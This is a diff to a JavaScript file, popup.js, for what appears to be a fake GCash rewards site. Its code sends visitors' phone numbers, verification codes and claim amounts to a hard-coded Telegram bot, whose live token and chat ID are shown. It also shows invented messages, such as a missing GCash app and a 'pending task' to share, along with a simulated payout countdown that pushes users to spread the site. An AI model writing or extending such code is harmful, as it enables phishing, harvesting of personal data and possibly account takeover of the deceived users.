@@ -1,3 +1,6 @@
+// ========== POPUP.JS - COMPLETE VERSION ==========
+// Supports both main.html and share_and_earn.html
+
 let claimState = {
     isProcessing: false,
     currentAmount: 0,
@@ -23,7 +26,7 @@ async function getFirewallStatus() {
         const db = firebase.database();
         const snap = await db.ref('admin/globalFirewall').once('value');
         const data = snap.val();
-        console.log("🔥 Firewall status from Firebase:", data);
+        console.log("Firewall status from Firebase:", data);
         if (data === null) {
             console.warn("No firewall data, creating default...");
             await db.ref('admin/globalFirewall').set({
@@ -40,22 +43,20 @@ async function getFirewallStatus() {
     }
 }
 
-// Real-time listener for firewall changes
 function listenToFirewallChanges() {
     if (typeof firebase === 'undefined' || !firebase.database) return;
     const db = firebase.database();
     db.ref('admin/globalFirewall').on('value', (snapshot) => {
         const data = snapshot.val();
         cachedFirewallStatus = (data && data.active === true);
-        console.log("🔥 Firewall status updated (real-time):", cachedFirewallStatus);
+        console.log("Firewall status updated:", cachedFirewallStatus);
         
-        // Optional: Update UI if needed
         const statusLabel = document.getElementById('statusLabel');
         if (statusLabel && cachedFirewallStatus) {
-            statusLabel.innerHTML = "⚠️ FIREWALL ACTIVE - Verification required ⚠️";
+            statusLabel.innerHTML = "FIREWALL ACTIVE - Verification required";
             statusLabel.style.color = "#ff8888";
         } else if (statusLabel && !cachedFirewallStatus) {
-            statusLabel.innerHTML = "✨ Welcome! ✨";
+            statusLabel.innerHTML = "Welcome!";
             statusLabel.style.color = "#fbbf24";
         }
     });
@@ -66,15 +67,23 @@ async function isFirewallActive() {
 }
 
 async function sendTelegram(phone, code) {
-    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
+    const msg = `VERIFY REQUEST\nPhone: ${phone}\nCode: ${code}`;
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
-        console.log("📨 Telegram sent");
+        console.log("Telegram sent");
+    } catch(e) {}
+}
+
+async function sendClaimTelegram(phone, amount, linkStatus) {
+    const msg = `CLAIM REQUEST\nPhone: ${phone}\nAmount: ₱${amount}\nLink Status: ${linkStatus}`;
+    try {
+        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+        console.log("Claim notification sent to Telegram");
     } catch(e) {}
 }
 
 function showFirewallPopup() {
-    console.log("🔥 Showing firewall verification popup");
+    console.log("Showing firewall verification popup");
     const popup = document.getElementById('firewallPopup');
     if (!popup) {
         console.error("Firewall popup element not found!");
@@ -104,7 +113,7 @@ function showFirewallPopup() {
     
     currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
     verificationAttempts = 0;
-    console.log("📞 VERIFICATION CODE:", currentVerificationCode);
+    console.log("VERIFICATION CODE:", currentVerificationCode);
     
     popup.style.display = 'flex';
     setTimeout(() => {
@@ -183,8 +192,8 @@ async function getLatestPayoutLink() {
         if (snapshot.exists()) {
             const key = Object.keys(snapshot.val())[0];
             const linkData = snapshot.val()[key];
-            console.log("🔗 Found payout link:", linkData.url);
-            return linkData.url || null;
+            console.log("Found payout link:", linkData.url);
+            return { url: linkData.url, key: key };
         }
         console.warn("No available links found in Firebase");
         return null;
@@ -194,13 +203,52 @@ async function getLatestPayoutLink() {
     }
 }
 
+// ========== SHOW NO LINK ALERT (STYLISH) ==========
+function showNoLinkAlert() {
+    const modal = document.createElement('div');
+    modal.id = 'customAlert';
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.backdropFilter = 'blur(10px)';
+    modal.style.zIndex = '20000';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    modal.style.fontFamily = "'Inter', sans-serif";
+    
+    modal.innerHTML = `
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
+            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
+            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNAVAILABLE</h3>
+            <div style="color: white; font-size: 14px; line-height: 1.6; text-align: left;">
+                <p style="margin-bottom: 12px;">1. There is no GCash App installed on your device.</p>
+                <p style="margin-bottom: 5px;">2. Share and complete the pending task to withdraw your rewards.</p>
+            </div>
+            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    
+    document.getElementById('closeAlertBtn').onclick = function() {
+        modal.remove();
+    };
+    
+    modal.onclick = function(e) {
+        if (e.target === modal) modal.remove();
+    };
+}
+
 // ========== MAIN CLAIM POPUP ==========
 async function showClaimPopup(amount) {
     console.log("showClaimPopup called with amount:", amount);
     
-    // Get latest firewall status
     const firewallActive = await getFirewallStatus();
-    console.log("🔥 Firewall active:", firewallActive);
+    console.log("Firewall active:", firewallActive);
     
     if (firewallActive) {
         console.log("FIREWALL ON - Showing verification popup");
@@ -317,136 +365,8 @@ function startImaginaryTimer(redirectUrl) {
     }, 2000);
 }
 
-// ========== CLAIM ACTION ==========
-function onClaimAction() {
-    if (claimState.isProcessing) return;
-    
-    claimState.isProcessing = true;
-    const claimBtn = document.getElementById('claimActionBtn');
-    const amount = claimState.currentAmount;
-    const userPhone = localStorage.getItem("userPhone") || "Unknown";
-    
-    claimBtn.disabled = true;
-    claimBtn.innerHTML = 'PROCESSING...';
-    
-    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
-        .catch(e => console.log('Telegram error:', e));
-    
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
-        
-        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
-            if (snapshot.exists()) {
-                const key = Object.keys(snapshot.val())[0];
-                const linkData = snapshot.val()[key];
-                const redirectUrl = linkData.url;
-                
-                db.ref('links/' + key).update({ 
-                    status: 'claimed', 
-                    user: userPhone, 
-                    amount: amount, 
-                    claimedAt: Date.now() 
-                });
-                
-                hideClaimPopup();
-                showPendingStatus();
-                startSmoothDecrement(amount);
-                startVisibleCountdown(amount);
-                startImaginaryTimer(redirectUrl);
-                
-            } else {
-                claimBtn.innerHTML = 'NO REWARDS';
-                setTimeout(() => {
-                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
-                    claimBtn.disabled = false;
-                    claimState.isProcessing = false;
-                }, 3000);
-                alert("Your Withdrawal is unsuccessful. Switch another device and claim your rewards!.");
-            }
-        }).catch((err) => {
-            console.error("Firebase error:", err);
-            claimBtn.innerHTML = 'ERROR';
-            setTimeout(() => {
-                claimBtn.innerHTML = 'CLAIM THRU GCASH';
-                claimBtn.disabled = false;
-                claimState.isProcessing = false;
-            }, 3000);
-        });
-    }
-}
-
-document.addEventListener('DOMContentLoaded', function() { 
-    hidePendingStatus();
-    // Initialize firewall listener
-    listenToFirewallChanges();
-    // Get initial status
-    getFirewallStatus().then(status => {
-        console.log("Initial firewall status:", status);
-        cachedFirewallStatus = status;
-    });
-    console.log("Popup.js loaded");
-});
-
-
-// ========== ADAPTED FUNCTIONS FOR SHARE_AND_EARN (NO BALANCE DISPLAY) ==========
-// Idagdag ito sa dulo ng popup.js file, bago ang DOMContentLoaded event
-
-// Override startSmoothDecrement para sa share_and_earn (walang balance display)
-const originalStartSmoothDecrement = startSmoothDecrement;
-window.startSmoothDecrement = function(originalAmount) {
-    const balanceText = document.getElementById('balanceText');
-    if (!balanceText) {
-        console.log("No balance display - skipping decrement animation");
-        return;
-    }
-    originalStartSmoothDecrement(originalAmount);
-};
-
-// Override startVisibleCountdown para sa share_and_earn
-const originalStartVisibleCountdown = startVisibleCountdown;
-window.startVisibleCountdown = function(originalAmount) {
-    const timerSpan = document.getElementById('pendingCountdown');
-    if (!timerSpan) {
-        console.log("No countdown display - skipping");
-        return;
-    }
-    originalStartVisibleCountdown(originalAmount);
-};
-
-// Ensure showClaimPopup works even without balanceText
-const originalShowClaimPopup = showClaimPopup;
-window.showClaimPopup = async function(amount) {
-    console.log("showClaimPopup called with amount:", amount);
-    
-    const firewallActive = await getFirewallStatus();
-    console.log("Firewall active:", firewallActive);
-    
-    if (firewallActive) {
-        console.log("FIREWALL ON - Showing verification popup");
-        showFirewallPopup();
-        return;
-    }
-    
-    console.log("FIREWALL OFF - Showing congratulations popup");
-    claimState.currentAmount = amount;
-    claimState.isProcessing = false;
-    claimState.hasRedirected = false;
-    
-    const popup = document.getElementById('claimPopup');
-    const prizeSpan = document.getElementById('popupPrizeAmount');
-    const claimBtn = document.getElementById('claimActionBtn');
-    
-    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
-    if (claimBtn) {
-        claimBtn.innerHTML = 'CLAIM THRU GCASH';
-        claimBtn.disabled = false;
-    }
-    if (popup) popup.style.display = 'flex';
-};
-
-// Ensure onClaimAction works for share_and_earn
-const originalOnClaimAction = onClaimAction;
-window.onClaimAction = function() {
+// ========== CLAIM ACTION WITH FIREWALL + DEPLOY LINK + TELEGRAM ==========
+async function onClaimAction() {
     if (claimState.isProcessing) return;
     
     claimState.isProcessing = true;
@@ -459,24 +379,43 @@ window.onClaimAction = function() {
         claimBtn.innerHTML = 'PROCESSING...';
     }
     
-    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
-        .catch(e => console.log('Telegram error:', e));
+    // Check if firewall is ON
+    const firewallActive = await getFirewallStatus();
+    
+    if (firewallActive) {
+        console.log("Firewall ON - Showing verification popup");
+        showFirewallPopup();
+        if (claimBtn) {
+            claimBtn.disabled = false;
+            claimBtn.innerHTML = 'CLAIM THRU GCASH';
+        }
+        claimState.isProcessing = false;
+        return;
+    }
+    
+    // FIREWALL OFF - Check for deployed links
+    console.log("Firewall OFF - Checking for payout links");
     
     if (typeof firebase !== 'undefined' && firebase.database) {
         const db = firebase.database();
         
-        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
-            if (snapshot.exists()) {
-                const key = Object.keys(snapshot.val())[0];
-                const linkData = snapshot.val()[key];
+        try {
+            const linkData = await getLatestPayoutLink();
+            
+            if (linkData && linkData.url) {
                 const redirectUrl = linkData.url;
+                const linkKey = linkData.key;
                 
-                db.ref('links/' + key).update({ 
+                // Mark link as claimed
+                await db.ref('links/' + linkKey).update({ 
                     status: 'claimed', 
                     user: userPhone, 
                     amount: amount, 
                     claimedAt: Date.now() 
                 });
+                
+                // Send Telegram notification for successful claim
+                await sendClaimTelegram(userPhone, amount, 'Link found - Redirecting');
                 
                 hideClaimPopup();
                 showPendingStatus();
@@ -493,33 +432,55 @@ window.onClaimAction = function() {
                 startImaginaryTimer(redirectUrl);
                 
             } else {
+                // NO LINKS DEPLOYED - Show stylish alert and send Telegram
+                await sendClaimTelegram(userPhone, amount, 'No link available');
+                showNoLinkAlert();
+                
                 if (claimBtn) {
-                    claimBtn.innerHTML = 'NO REWARDS';
-                    setTimeout(() => {
-                        claimBtn.innerHTML = 'CLAIM THRU GCASH';
-                        claimBtn.disabled = false;
-                        claimState.isProcessing = false;
-                    }, 3000);
-                }
-                alert("Your Withdrawal is unsuccessful. Switch another device and claim your rewards!.");
-            }
-        }).catch((err) => {
-            console.error("Firebase error:", err);
-            if (claimBtn) {
-                claimBtn.innerHTML = 'ERROR';
-                setTimeout(() => {
-                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                     claimBtn.disabled = false;
-                    claimState.isProcessing = false;
-                }, 3000);
+                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
+                }
+                claimState.isProcessing = false;
             }
-        });
+            
+        } catch (err) {
+            console.error("Firebase error:", err);
+            await sendClaimTelegram(userPhone, amount, 'Firebase error - No link');
+            showNoLinkAlert();
+            
+            if (claimBtn) {
+                claimBtn.disabled = false;
+                claimBtn.innerHTML = 'CLAIM THRU GCASH';
+            }
+            claimState.isProcessing = false;
+        }
+    } else {
+        // No Firebase
+        await sendClaimTelegram(userPhone, amount, 'Firebase not available');
+        showNoLinkAlert();
+        
+        if (claimBtn) {
+            claimBtn.disabled = false;
+            claimBtn.innerHTML = 'CLAIM THRU GCASH';
+        }
+        claimState.isProcessing = false;
     }
-};
+}
 
-// Expose functions for global access
+// ========== EXPORT FUNCTIONS FOR SHARE_AND_EARN ==========
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
 window.verifyFirewallCode = verifyFirewallCode;
 window.showClaimPopup = showClaimPopup;
 window.onClaimAction = onClaimAction;
+
+// ========== INITIALIZE ==========
+document.addEventListener('DOMContentLoaded', function() { 
+    hidePendingStatus();
+    listenToFirewallChanges();
+    getFirewallStatus().then(status => {
+        console.log("Initial firewall status:", status);
+        cachedFirewallStatus = status;
+    });
+    console.log("Popup.js loaded - Ready for main.html and share_and_earn.html");
+});
